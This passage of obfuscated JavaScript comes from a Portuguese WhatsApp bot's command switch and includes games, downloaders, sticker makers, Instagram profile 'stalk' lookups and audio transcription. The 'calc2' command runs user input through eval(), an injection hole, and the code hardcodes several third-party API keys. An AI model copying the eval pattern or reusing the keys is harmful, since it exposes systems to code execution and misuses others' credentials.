                console.error(_0x369a0f);
                _0x50740b("Ocorreu um erro ao buscar ou enviar o áudio do Spotify.");
              }
              break;
            case "spotifydl":
              try {
                if (!_0x11e99e) {
                  return _0x50740b("Por favor, forneça o link da música do Spotify.");
                }
                let _0x26c697 = await _0x39d764(_0x11e99e);
                console.log(_0x26c697);
              } catch (_0x284c8a) {
                console.error(_0x284c8a);
                _0x50740b("Ocorreu um erro ao baixar a música do Spotify.");
              }
              break;
            case "spotifysearch":
              if (!_0x11e99e) {
                return _0x50740b("Por favor, forneça o link da música do Spotify.");
              }
              _0x48f566(_0x11e99e).then(_0xd9fa45 => {
                console.log(_0xd9fa45);
              })["catch"](_0x536672 => {
                console.error(_0x536672);
                _0x50740b("Ocorreu um erro ao buscar informações da música no Spotify.");
              });
              break;
            case "minado":
              {
                if (_0x4b8e82) {
                  return _0x50740b("*Uma partida já foi iniciada, espere acabar para iniciar uma nova...*");
                }
                if (!_0x11e99e) {
                  return _0x50740b("*Diga a dificuldade: easy, normal, hard*");
                }
                let _0x1467ba = _0x23d865[0].toLowerCase();
                const _0x4ff5a1 = {
                  easy: 0x5,
                  normal: 0x8,
                  hard: 0xc
                };
                if (!(_0x1467ba in _0x4ff5a1)) {
                  return _0x50740b("*Dificuldade inválida*");
                }
                let _0x386cb3 = _0x4ff5a1[_0x1467ba];
                let _0x4f15f7 = await _0x3373c3(_0x5cfdbf, _0x386cb3);
                let _0x131e68 = [5, 3, 5, 8][[5, 8, 12].indexOf(_0x386cb3)];
                let _0x218ac8 = _0x5cfdbf.filter(_0x23be69 => !_0x4f15f7.includes(_0x23be69));
                let _0x552938 = {
                  'id': _0x346d97,
                  'pos_mines': _0x4f15f7,
                  'qnt_mines': _0x386cb3,
                  'selected_cord': [],
                  'cord_to_win': _0x218ac8,
                  'attempts': _0x131e68,
                  'tips_d': 0x0,
                  'hits': 0x0,
                  'minesp': JSON.parse(fs.readFileSync("./DADOS/json/minesframe.json"))
                };
                _0x3a2927.push(_0x552938);
                fs.writeFileSync("./DADOS/json/mines.json", JSON.stringify(_0x3a2927, null, 2));
                _0x5196be.sendMessage(_0x346d97, {
                  'image': fs.readFileSync("./DADOS/json/bomb.jpg"),
                  'caption': "💥 *CAMPO MINADO INICIADO* \n\nX 1️⃣2️⃣3️⃣4️⃣5️⃣\nA 🟦🟦🟦🟦🟦\nB 🟦🟦🟦🟦🟦\nC 🟦🟦🟦🟦🟦\nD 🟦🟦🟦🟦🟦\nE 🟦🟦🟦🟦🟦\n\n*Minas* : [ " + _0x386cb3 + " ]\n*Dificuldade* : [ " + _0x1467ba + " ]\n*Tentativas* : " + _0x131e68
                });
              }
              break;
            case "mina":
              {
                if (!_0x4b8e82) {
                  return _0x50740b("*Nenhuma partida foi iniciada*");
                }
                if (!_0x11e99e) {
                  return _0x50740b("*Diga a dificuldade: easy, normal, hard*");
                }
                let _0x1e9a17 = _0x3a2927.findIndex(_0x5afe69 => _0x5afe69.id === _0x346d97 && _0x5afe69.qnt_mines && _0x5afe69.attempts > 0);
                if (_0x1e9a17 === -1) {
                  return _0x50740b("*Partida não encontrada*");
                }
                let _0x163805 = _0x3a2927[_0x1e9a17].selected_cord;
                let _0x430783 = _0x3a2927[_0x1e9a17];
                let _0x4c44d5 = _0x430783.minesp;
                for (let _0x5d4b95 of _0x23d865) {
                  let _0x546a37 = _0x5d4b95.toLowerCase();
                  if (!_0x5cfdbf.includes(_0x546a37) || _0x163805.includes(_0x546a37)) {
                    return _0x50740b("Escolha uma coordenada");
                  }
                  if (_0x430783.pos_mines.includes(_0x546a37)) {
                    _0x4c44d5[_0x546a37] = '💣';
                    _0x430783.attempts -= 1;
                    _0x430783.tips_d = 0;
                  } else {
                    _0x4c44d5[_0x546a37] = '⭐';
                    _0x430783.hits += 1;
                    _0x430783.tips_d += 1;
                  }
                  _0x163805.push(_0x546a37);
                }
                let _0x2f0402 = "💥 *CAMPO MINADO*\n\nX 1️⃣2️⃣3️⃣4️⃣5️⃣\nA " + _0x4c44d5.a1 + _0x4c44d5.a2 + _0x4c44d5.a3 + _0x4c44d5.a4 + _0x4c44d5.a5 + "\nB " + _0x4c44d5.b1 + _0x4c44d5.b2 + _0x4c44d5.b3 + _0x4c44d5.b4 + _0x4c44d5.b5 + "\nC " + _0x4c44d5.c1 + _0x4c44d5.c2 + _0x4c44d5.c3 + _0x4c44d5.c4 + _0x4c44d5.c5 + "\nD " + _0x4c44d5.d1 + _0x4c44d5.d2 + _0x4c44d5.d3 + _0x4c44d5.d4 + _0x4c44d5.d5 + "\nE " + _0x4c44d5.e1 + _0x4c44d5.e2 + _0x4c44d5.e3 + _0x4c44d5.e4 + _0x4c44d5.e5 + "\n\n*Minas* : [ " + _0x430783.qnt_mines + " ]\n*Tentativas* : [ " + _0x430783.attempts + " ]\n*Acertos* : [ " + _0x430783.hits + " ]";
                if (_0x430783.attempts <= 0) {
                  _0x3a2927.splice(_0x1e9a17, 1);
                  fs.writeFileSync("./DADOS/json/mines.json", JSON.stringify(_0x3a2927, null, 2));
                  _0x5196be.sendMessage(_0x346d97, {
                    'image': fs.readFileSync("./DADOS/json/bomb.jpg"),
                    'caption': _0x2f0402 + "\n\n*😭 Que pena! você perdeu!❌*"
                  });
                } else {
                  if (_0x163805.length >= _0x430783.cord_to_win.length) {
                    containAll = _0x430783.cord_to_win.every(_0x203763 => _0x163805.includes(_0x203763));
                    if (containAll) {
                      _0x3a2927.splice(_0x1e9a17, 1);
                      fs.writeFileSync("./DADOS/json/mines.json", JSON.stringify(_0x3a2927, null, 2));
                      _0x5196be.sendMessage(_0x346d97, {
                        'image': fs.readFileSync("./DADOS/json/bomb.jpg"),
                        'caption': _0x2f0402 + "\n\n*🥳 Parabéns! você venceu!✅*"
                      });
                    }
                  } else {
                    if (_0x430783.tips_d >= 3) {
                      fs.writeFileSync("./DADOS/json/mines.json", JSON.stringify(_0x3a2927, null, 2));
                      _0x5196be.sendMessage(_0x346d97, {
                        'image': fs.readFileSync("./DADOS/json/bomb.jpg"),
                        'caption': _0x2f0402 + "\n\nVocê Tem direito a " + parseInt(_0x430783.tips_d / 3) + " Dica(s)"
                      });
                    } else {
                      fs.writeFileSync("./DADOS/json/mines.json", JSON.stringify(_0x3a2927, null, 2));
                      _0x5196be.sendMessage(_0x346d97, {
                        'image': fs.readFileSync("./DADOS/json/bomb.jpg"),
                        'caption': _0x2f0402
                      });
                    }
                  }
                }
              }
              break;
            case "minareset":
              {
                if (!_0x4b8e82) {
                  return _0x50740b("*Nehuma partida foi iniciada*");
                }
                let _0x263c70 = _0x526ac1.indexOf(_0x346d97);
                _0x3a2927.splice(_0x263c70, 1);
                fs.writeFileSync("./DADOS/json/mines.json", JSON.stringify(_0x3a2927, null, 2));
                _0x50740b("*Campo minado resetado com sucesso!*");
              }
              break;
            case "mineshelp":
            case "infominado":
              _0x50740b(_0x57d916(_0x141936));
              break;
            case "minatips":
            case "minadicas":
              if (!_0x4b8e82) {
                return _0x50740b("*Nenhuma partida foi iniciada*");
              }
              let _0x2079d7 = _0x3a2927.findIndex(_0x420409 => _0x420409.id === _0x346d97 && _0x420409.tips_d >= 3);
              if (_0x2079d7 === -1) {
                return _0x50740b("*Acerte 3 ou mais vezes para ter direito a uma dica*");
              }
              let _0x2061a0 = _0x3a2927[_0x2079d7];
              let _0x4e0353 = Math.random() < 0.5;
              let _0x19e360 = Math.floor(Math.random() * _0x2061a0.pos_mines.length);
              let _0xf367d4 = _0x2061a0.pos_mines[_0x19e360];
              let _0x169588;
              let _0xd24d0b;
              let _0x22b65f;
              if (!_0x4e0353) {
                _0xd24d0b = "fileira";
                _0x22b65f = _0xf367d4.charAt(0);
                _0x169588 = _0x94649f => _0x94649f.startsWith(_0x22b65f);
              } else {
                _0xd24d0b = "coluna";
                _0x22b65f = _0xf367d4.charAt(1);
                _0x169588 = _0x362c8b => _0x362c8b.endsWith(_0x22b65f);
              }
              let _0x3b812a = _0x2061a0.pos_mines.filter(_0x169588).length;
              _0x2061a0.tips_d -= 3;
              fs.writeFileSync("./DADOS/json/mines.json", JSON.stringify(_0x3a2927, null, 2));
              _0x50740b("*_💡Há " + _0x3b812a + " bomba(s) na " + _0xd24d0b + " " + _0x22b65f + "💡_*");
              break;
            case "calculadora2":
            case "calc2":
              {
                entrada = _0x11e99e;
                resultado2;
                function _0x382f21(_0x56562e) {
                  const _0x10691a = {
                    func: Math.sin,
                    mensagem: "O seno de"
                  };
                  const _0x90d59e = {
                    func: Math.cos,
                    mensagem: "O cosseno de"
                  };
                  const _0x5c7ddb = {
                    func: Math.tan,
                    mensagem: "A tangente de"
                  };
                  const _0x2778e0 = {
                    func: Math.sqrt,
                    mensagem: "A raiz quadrada de"
                  };
                  const _0x41cfdb = {
                    func: Math.log,
                    mensagem: "O logaritmo de"
                  };
                  const _0x45b65d = {
                    func: Math.log,
                    mensagem: "O logaritmo natural de"
                  };
                  const _0x5f3f9b = {
                    func: Math.exp,
                    mensagem: "A exponencial de"
                  };
                  funcoes = {
                    'sin': _0x10691a,
                    'cos': _0x90d59e,
                    'tan': _0x5c7ddb,
                    'sqrt': _0x2778e0,
                    'log': _0x41cfdb,
                    'ln': _0x45b65d,
                    'exp': _0x5f3f9b,
                    'area_retangulo': {
                      'func': function (_0x21e5ce, _0x492670) {
                        return _0x21e5ce * _0x492670;
                      },
                      'mensagem': "A área do retângulo com base"
                    }
                  };
                  funcao = _0x56562e.split('(')[0];
                  if (funcoes.hasOwnProperty(funcao)) {
                    argumentos = _0x56562e.substring(funcao.length + 1, _0x56562e.length - 1).split(',');
                    return {
                      'resultado2': funcoes[funcao].func.apply(null, argumentos),
                      'mensagem': funcoes[funcao].mensagem
                    };
                  } else {
                    return {
                      'resultado2': _0x15d16b(_0x56562e),
                      'mensagem': "O resultado do cálculo é:"
                    };
                  }
                }
                function _0x15d16b(_0x146163) {
                  rsp = _0x146163.replace('x', '*').replace("\"", ':').replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", 'gi'), '').replace('÷', '/');
                  return eval(rsp);
                }
                if (entrada.trim() === '') {
                  return _0x50740b("Para usar a calculadora científica, digite !calc2 seguido de uma expressão matemática, por exemplo: !calc2 sin(0)\n\nExemplos de uso:\n!calc2 p/ Calc simples *+/-** Ex: 2+2\n!calc2 sin(0) p/ o *seno*\n!calc2 cos(0) p/ o *cosseno*\n!calc2 tan(0) p/ *tangente*\n!calc2 sqrt(25) p/ a *raiz quadrada*\n!calc2 ln(1) p/ o *logaritmo*\n!calc2 log(10) p/ *logaritmo natural*\n!calc2 exp(1) p/ *exponencial*\n!calc2 area_retangulo(5, 10) p/ *área do retângulo*\n");
                }
                if (/[sin|cos|tan|sqrt|log|ln|exp]/.test(entrada)) {
                  resultadoObj = _0x382f21(entrada);
                  _0x50740b("Calculando " + resultadoObj.mensagem + " " + entrada.split('(')[1].split(')')[0] + "...");
                  setTimeout(function () {
                    _0x50740b(resultadoObj.mensagem + " " + entrada.split('(')[1].split(')')[0] + " é " + resultadoObj.resultado2);
                  }, 2000);
                } else {
                  _0x50740b("Calculando...");
                  setTimeout(function () {
                    resultado2 = _0x15d16b(entrada);
                    _0x50740b("O resultado do cálculo é: " + resultado2);
                  }, 2000);
                }
              }
              break;
            case "gta":
              try {
                let [_0x56397b, _0x57c6eb] = _0x11e99e.split('/');
                if (!_0x56397b || !_0x57c6eb) {
                  return _0x50740b('_*' + _0x33c0c0 + ", " + _0x671b4b + "... Parece que você esqueceu de colocar o texto.*_\n_*Exemplo de como usar*_\n⬇️⬇️⬇️\n\n_*" + (_0x141936 + _0x267d4b) + " ~Mission Passed/ESDEATH-BOT~*_");
                }
                const _0x1eeed2 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'text': '_*' + _0x33c0c0 + ", ~@" + _0x246d48.split('@')[0] + "~...*_\n_*Estou criando a sua figurinha do GTA*_",
                  'mentions': [_0x246d48]
                }, _0x1eeed2);
                let _0x10fb90 = await getBuffer("https://api.lolhuman.xyz/api/gtapassed?apikey=gataDios&text1=" + _0x56397b + "&text2=" + _0x57c6eb);
                let _0x23b5a2 = "data:image/jpeg;base64," + _0x10fb90.toString("base64");
                let _0x53a2b5 = await convertSticker(_0x23b5a2, "📍 Criado por: " + NomeDoBot, '❄️');
                let _0x504119 = Buffer.from(_0x53a2b5, "base64");
                const _0x4c9578 = {
                  sticker: _0x504119
                };
                const _0x84f091 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x4c9578, _0x84f091);
              } catch (_0x1f43af) {
                _0x50740b("Erro ao processar o comando.");
              }
              break;
            case "enquete":
              try {
                if (!_0x89cd51 || !_0x3f2f63 || !_0x11e99e.includes('|') || (_0x11e99e.match(/\|/g) || []).length < 2) {
                  return _0x50740b(!_0x89cd51 ? "Só pode ser utilizado este comando, em grupo." : !_0x3f2f63 ? "Você precisa ser adm!" : "Crie pelo menos duas opções, exemplo: titulo|op1|op2");
                }
                let _0x2faf02 = _0x11e99e.split('|');
                let _0x124ff5 = Array.from({
                  'length': Math.min((_0x11e99e.match(/\|/g) || []).length, 12)
                }, (_0x55b8af, _0x579431) => ({
                  'optionName': _0x2faf02[_0x579431 + 1]
                }));
                const _0x572b88 = {
                  messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk="
                };
                const _0x1dab6c = {
                  name: _0x2faf02[0],
                  options: _0x124ff5,
                  selectableOptionsCount: 0x1
                };
                const _0x48999a = {
                  messageContextInfo: _0x572b88,
                  pollCreationMessage: _0x1dab6c
                };
                _0x5196be.relayMessage(_0x346d97, _0x48999a, {});
              } catch (_0x38b127) {
                console.log(_0x38b127);
              }
              break;
            case "sigma":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Comando disponível apenas no modobrincadeira. Use " + _0x141936 + "modobrincadeira 1");
              }
              percentualSigma = Math.floor(Math.random() * 100);
              respostaSigma = percentualSigma < 7 ? "Você é um Beta" : percentualSigma < 15 ? "Só isso? Vai malhar seu Beta!" : percentualSigma < 35 ? "Sigma Iniciante 🍷" : percentualSigma < 40 ? "Sigma Sábio 🧠" : percentualSigma < 55 ? "Sigma Mestre 🗿" : percentualSigma < 70 ? "Sigma Elite 🗿" : percentualSigma < 100 ? "Sigma Total 🗿🍷" : '';
              const _0x50f73e = {
                text: '🗿',
                key: _0xd2050d.key
              };
              const _0x7f6f2b = {
                react: _0x50f73e
              };
              _0x5196be.sendMessage(_0x346d97, _0x7f6f2b);
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando a sua ficha de Sigma: @" + _0x1911ab.split('@')[0] + " aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              const _0x31aabc = {
                url: "https://telegra.ph/file/ef7b0293856ee26e17669.jpg"
              };
              _0x5196be.sendMessage(_0x346d97, {
                'image': _0x31aabc,
                'caption': "O quanto você é Sigma?\n\n「 @" + _0x1911ab.split('@')[0] + " 」 Você é: " + percentualSigma + "% \n" + respostaSigma,
                'mentions': [_0x1911ab]
              });
              break;
            case "memesticker":
              try {
                ;
                texto1 = _0x11e99e.split('/')[0] || "Indefinido";
                texto2 = _0x11e99e.split('/')[1] || "Indefinido";
                if (!_0x11e99e.includes('/')) {
                  return _0x50740b("Cadê a /\nExemplo: " + (_0x141936 + _0x267d4b) + " Darkz/Lindo");
                }
                if (!_0x54198a && !_0x39e519) {
                  return _0x50740b("😈 _Você não marcou a foto. Selecione uma imagem para criar o sticker._");
                }
                _0x50740b("😈 _Aguarde, estou criando o sticker..._");
                let _0x311db5;
                if (_0x54198a) {
                  _0x311db5 = JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage;
                } else {
                  if (_0x39e519) {
                    _0x311db5 = _0xd2050d.message.imageMessage;
                  }
                }
                imagem = await downloadContentFromMessage(_0x311db5, "image");
                base64 = Buffer.from([]);
                for await (const _0x52415b of imagem) {
                  base64 = Buffer.concat([base64, _0x52415b]);
                }
                _0x24e1d3 = await upload(base64);
                memeApiUrl = "https://api.lolhuman.xyz/api/memecreator?apikey=gatadios&text1=" + texto1 + "&text2=" + texto2 + "&img=" + _0x24e1d3 + "/revision/latest/top-crop/width/360/height/450?cb=20190205113053";
                memeBuffer = await getBuffer(memeApiUrl);
                base64Sticker = "data:image/jpeg;base64," + memeBuffer.toString("base64");
                stickerBuffer = await convertSticker(base64Sticker, '❄️', '' + NomeDoBot);
                stickerImageBuffer = new Buffer.from(stickerBuffer, "base64");
                const _0x2132f8 = {
                  sticker: stickerImageBuffer
                };
                const _0x108d13 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x2132f8, _0x108d13);
              } catch (_0x555b82) {
                console.error(_0x555b82);
                return _0x50740b("😈 _Erro ao criar o sticker. Tente novamente mais tarde._");
              }
              break;
            case "aptoide":
              try {
                let {
                  search: _0x5bab3c,
                  download: _0x1aba1e
                } = require("aptoide-scraper");
                if (!_0x11e99e) {
                  return _0x50740b("😈 *Exemplo:*\n\n" + (_0x141936 + _0x267d4b) + " whatsapp");
                }
                _0x50740b("🔍 _Procurando aplicativo, aguarde..._");
                let _0x508aa9 = await _0x5bab3c(_0x11e99e);
                if (_0x508aa9.length > 0) {
                  let _0x5e3a73 = _0x508aa9[0];
                  let _0x4cfdfb = await _0x1aba1e(_0x5e3a73.id);
                  let _0x56f122 = "\n┌─⊷ *APTOIDE APK* 📂\n▢ *Nome:* " + _0x5e3a73.name + "\n▢ *Pacote:* " + _0x4cfdfb["package"] + "\n▢ *Atualização:* " + _0x4cfdfb.lastup + "\n▢ *Tamanho:* " + _0x4cfdfb.size + "\n└────────────────┈ ⳹ ";
                  const _0xb4165e = {
                    url: _0x4cfdfb.icon
                  };
                  const _0x3eb2f5 = {
                    image: _0xb4165e,
                    caption: _0x56f122
                  };
                  const _0x192c3d = {
                    quoted: _0xd2050d
                  };
                  await _0x5196be.sendMessage(_0x346d97, _0x3eb2f5, _0x192c3d);
                  _0x50740b("😈 *_AGUARDE ESTOU FAZENDO O DOWNLOAD DO APLICATIVO._*");
                  tipoArquivo = _0x4cfdfb["package"].split('.').pop();
                  const _0x12ad80 = {
                    url: _0x4cfdfb.dllink
                  };
                  const _0x43c34b = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, {
                    'document': _0x12ad80,
                    'mimetype': "application/vnd.android.package-archive",
                    'fileName': _0x5e3a73.name + ".apk",
                    'caption': null
                  }, _0x43c34b);
                } else {
                  _0x50740b("❌ _Nenhum resultado encontrado para a busca._");
                }
              } catch (_0x5243dc) {
                console.error(_0x5243dc);
                return _0x50740b("😞 _Ocorreu um erro ao buscar informações do aplicativo. Tente novamente mais tarde._");
              }
              break;
            case "gdrive":
            case "googledrive":
              {
                if (!_0x11e99e.includes("drive.google.com")) {
                  return _0x50740b("Faltando o link do google drive para download do arquivo, cade?");
                }
                KaicKey2 = "Rooh_Mods-Gay";
                let _0x2acd2f = await fetchJson("http://sabapi.tech:8090/api/dl/gdrive?url=" + _0x11e99e + "&apikey=" + KaicKey2);
                _0x50740b("Aguarde, estou encaminhando o arquivo. Pode demorar até *2min* para enviar!");
                const _0x474bd5 = {
                  url: _0x2acd2f.resultado.downloadUrl
                };
                const _0x250a0f = {
                  document: _0x474bd5,
                  mimetype: _0x2acd2f.resultado.mimetype,
                  fileName: _0x2acd2f.resultado.fileName
                };
                _0x5196be.sendMessage(_0x346d97, _0x250a0f)["catch"](_0x2c836c => {
                  return _0x50740b("erro..");
                });
              }
              break;
            case "igstalk":
              if (!_0x11e99e) {
                return _0x50740b("Cadê o @?");
              }
              try {
                respostaApi = await fetchJson("http://www.api.baddeveloper.space:25572/api/igstalk/" + _0x11e99e);
                perfilInfo = await respostaApi;
                profilePhoto = perfilInfo.match(/profilePhoto: (.+)/)[1];
                fullName = perfilInfo.match(/Nome completo: (.+)/)[1];
                _0x1a5e67 = perfilInfo.match(/Nome de usuário: (.+)/)[1];
                posts = perfilInfo.match(/Posts: (.+)/)[1];
                followers = perfilInfo.match(/Seguidores: (.+)/)[1];
                bio = perfilInfo.match(/Bio: (.+)/)[1];
                caption = "Nome: " + fullName + "\nUsername: " + _0x1a5e67 + "\nPosts: " + posts + "\nSeguidores: " + followers + "\nBio: " + bio;
                const _0x3ce57b = {
                  url: profilePhoto
                };
                const _0x14e272 = {
                  image: _0x3ce57b,
                  caption: caption
                };
                _0x5196be.sendMessage(_0x346d97, _0x14e272);
              } catch (_0x594ac1) {
                console.error(_0x594ac1);
                _0x50740b("Ocorreu um erro ao buscar as informações do perfil.");
              }
              break;
            case "marvel":
            case "stone":
            case "space":
            case "pornhub":
            case "america":
            case "steel":
            case "grafity":
            case "glitch3":
              try {
                var [_0x3b5f31, _0x5b3ce6] = _0x11e99e.split('|');
                if (!_0x11e99e.includes('|')) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " Lotus|ESDEATH");
                }
                _0x50740b("Realizando ação..");
                _0x10a57b = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/logos_2?texto=" + _0x3b5f31 + "&texto2=" + _0x5b3ce6 + "&category=" + _0x267d4b + "&apikey=" + "Key_Do-Lotus_Samuel_EsDeath_12/08");
                const _0x2e767c = {
                  url: _0x10a57b.resultado
                };
                const _0xe654bf = {
                  image: _0x2e767c
                };
                const _0x49c887 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0xe654bf, _0x49c887)["catch"](_0x160f69 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x40d3d5) {
                return _0x50740b("Erro...");
              }
              break;
            case "mykey":
              _0x50740b(mykey);
              break;
            case "igstalk":
            case "instastalk":
            case "igsh":
            case "instagramstalker":
              if (!_0x11e99e) {
                return _0x50740b("Cadê o Instagram que queira que eu stalkeie? Exemplo: " + _0x141936 + _0x267d4b + " neymarjr");
              }
              KaicKey2 = "Rooh_Mods-Gay";
              insta = await fetchJson("http://kaicapis.online:5021/api/insta-stalk?query=" + _0x11e99e + "&apitoken=" + KaicKey2);
              const _0x5ad91 = {
                url: insta.resultado[0].foto_perfil
              };
              const _0x2bb931 = {
                image: _0x5ad91,
                caption: "*Stalker User's*\n\n*Usuário:* " + insta.resultado[0].username + "\n*Postagens:* " + insta.resultado[0].posts + "\n*Seguidores:* " + insta.resultado[0].seguidores + "\n*Seguindo:* " + insta.resultado[0].seguindo + "\n*Biografia:* " + insta.resultado[0].biografia
              };
              const _0x39dbcb = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x2bb931, _0x39dbcb);
              break;
            case "wikipedia":
            case "wiki":
              try {
                if (!_0x11e99e) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " JavaScript");
                }
                _0x50740b("Aguarde, pesquisando sobre o que está perguntando..");
                wikip = await axios.get("https://pt.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=" + encodeURIComponent(_0x11e99e) + "&prop=info&inprop=url");
                wikis = await axios.get("https://pt.wikipedia.org/w/api.php?format=json&action=query&prop=extracts&exintro&explaintext&redirects=1&pageids=" + wikip.data.query.search[0].pageid);
                _0x50740b('' + wikis.data.query.pages[Object.keys(wikis.data.query.pages)].extract);
              } catch (_0x5a0e41) {
                if (String(_0x5a0e41).includes("invalid json response body at")) {
                  console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                  _0x50740b("Nada foi encontrado, com base em sua pergunta.. Especifique um pouco!");
                } else {
                  _0x50740b("Nada foi encontrado, com base em sua pergunta.. Especifique um pouco!");
                }
              }
              break;
            case "gitclone":
              {
                _0x50740b("Processando dados...");
                let _0x2d3df1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
                if (!_0x23d865[0]) {
                  _0x50740b("Use " + _0x141936 + "gitclone repo link\nExemplo: https://github.com/NuevaGeneracionALB/aleatory-md");
                }
                if (!_0x2d3df1.test(_0x23d865[0])) {
                  return _0x50740b("Aguarde");
                }
                let [, _0x58bd29, _0x36bf13] = _0x23d865[0].match(_0x2d3df1) || [];
                _0x36bf13 = _0x36bf13.replace(/.git$/, '');
                let _0x467273 = "https://api.github.com/repos/" + _0x58bd29 + '/' + _0x36bf13 + "/zipball";
                let _0x1aac32 = (await fetch(_0x467273, {
                  'method': "HEAD"
                })).headers.get("content-disposition").match(/attachment; filename=(.*)/)[1];
                const _0x2d9e13 = {
                  url: _0x467273
                };
                const _0x18c48c = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'document': _0x2d9e13,
                  'fileName': _0x1aac32 + ".zip",
                  'mimetype': "application/zip"
                }, _0x18c48c)["catch"](_0x3f232b => _0x50740b("ERROR!!"));
              }
              break;
            case "lyrics":
            case "letram":
            case "lirik":
              if (!_0x11e99e) {
                return _0x50740b("Cade O Nome Da Música? Tenha Certeza De Digitar Corretamente");
              }
              letra = lirik(_0x11e99e).then(_0x58cb21 => {
                teks = "\n💎Nome ➪ " + _0x11e99e + "\n♦️Letra ☟︎︎︎☟︎︎︎☟︎︎︎\n -----------------------------\n" + _0x58cb21.lirik + "\n -----------------------------";
                const _0xd8536d = {
                  url: _0x58cb21.thumb
                };
                const _0x520bec = {
                  image: _0xd8536d,
                  caption: teks
                };
                const _0x40a400 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x520bec, _0x40a400);
              });
              break;
            case "tiktok":
            case "facebook":
            case "instagram":
            case "twitter":
              bui3 = {
                '1': _0x141936 + _0x267d4b + "_audio " + _0x11e99e + " ",
                '2': _0x141936 + _0x267d4b + "_audio2 " + _0x11e99e + " ",
                '3': _0x141936 + _0x267d4b + "_video " + _0x11e99e + " ",
                '4': _0x141936 + _0x267d4b + "_video2 " + _0x11e99e + " "
              };
              _0x56d611[_0x346d97] = {
                'sender': _0x246d48,
                'time': Date.now() + 30000,
                'comandos': bui3
              };
              fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
              textAkinator = '*' + _0x267d4b + "*\nQual Formato Vc Deseja Para O Download?\n\n1 - 🎧 𝑨𝑼𝑫𝑰𝑶 📀\n2 - 🎧 𝑨𝑼𝑫𝑰𝑶 2 📀\n3 - 📽 𝑽𝑰𝑫𝑬𝑶 🖥\n4 - 📽 𝑽𝑰𝑫𝑬𝑶 2 🖥";
              const _0x3ffb57 = {
                text: textAkinator
              };
              _0x5196be.sendMessage(_0x346d97, _0x3ffb57);
              break;
            case "totext":
              if (!_0x2f2cdc) {
                return _0x50740b("Por favor, mencione um áudio para realizar a leitura do áudio.");
              }
              if (_0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage.fileLength > 2100000) {
                return _0x50740b("Só realizo a transcrição de áudio de até *2MB*, envie um arquivo menor.");
              }
              try {
                let _0x2f6d10 = await getFileBuffer(_0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, "audio");
                const _0x324a8b = {
                  text: "Estou realizando a transcrição do áudio para texto, aguarde..."
                };
                const _0x994343 = {
                  quoted: _0xd2050d
                };
                let {
                  key: _0x4c23e4
                } = await _0x5196be.sendMessage(_0x346d97, _0x324a8b, _0x994343);
                fs.writeFileSync("./DADOS/datab/data/totext-" + _0x246d48 + ".mp3", _0x2f6d10);
                const _0x147c9f = {
                  apiKey: "11d7fb1a4e8f4e4fac85d3b9be844b4a"
                };
                client2 = new AssemblyAI(_0x147c9f);
                const _0x1347bf = {
                  audio_url: "./DADOS/datab/data/totext-" + _0x246d48 + ".mp3",
                  language_code: 'pt'
                };
                _0x5aeb20 = await client2.transcripts.create(_0x1347bf);
                if (_0x5aeb20.status === "error") {
                  return _0x50740b("Ocorreu um erro ao transcrever o áudio! Por favor, tente novamente.");
                }
                if (_0x5aeb20.words.length == 0) {
                  return _0x50740b("Não foi possível transcrever o áudio enviado.");
                }
                const _0x45adbb = {
                  text: "• *Transcrição* - Quantidade de palavra(s) detectada(s) no texto: *" + _0x5aeb20.words.length + "*\n—\n• " + _0x5aeb20.text,
                  edit: _0x4c23e4
                };
                await _0x5196be.sendMessage(_0x346d97, _0x45adbb);
                DLT_FL("./DADOS/datab/data/totext-" + _0x246d48 + ".mp3");
              } catch (_0x1a9b52) {
                _0x50740b("erro...");
              }
              break;
            case "spotify2":
              if (!_0x11e99e) {
                return _0x50740b("cade o nome ou link da música");
              }
              try {
                KaicKey2 = "Rooh_Mods-Gay";
                if (linkfy.find(_0x11e99e)[0]?.["isLink"]) {
                  if (!_0x11e99e.includes("open.spotify.com/track/")) {
                    return _0x50740b("o formato de link aceito: open.spotify.com/track/...");
                  }
                  dataUrl = await fetchJson("http://sabapi.tech:8090/api/dl/spotify?url=" + _0x11e99e + "&apikey=" + KaicKey2);
                  const _0x33d6c9 = {
                    url: dataUrl.resultado.url
                  };
                  const _0x133d53 = {
                    audio: _0x33d6c9,
                    fileName: "audio.mp3",
                    mimetype: "audio/mpeg"
                  };
                  const _0x279e29 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x133d53, _0x279e29)["catch"](_0x569d3f => {
                    return _0x50740b("aconteceu um erro nesta música");
                  });
                } else {
                  _0x5aeb20 = await fetchJson("http://sabapi.tech:8090/api/spotifysearch?query=" + _0x11e99e + "&apikey=" + KaicKey2);
                  dataUrl = await fetchJson("http://sabapi.tech:8090/api/dl/spotify?url=" + _0x5aeb20.resultado.tracksArray[0].url + "&apikey=" + KaicKey2);
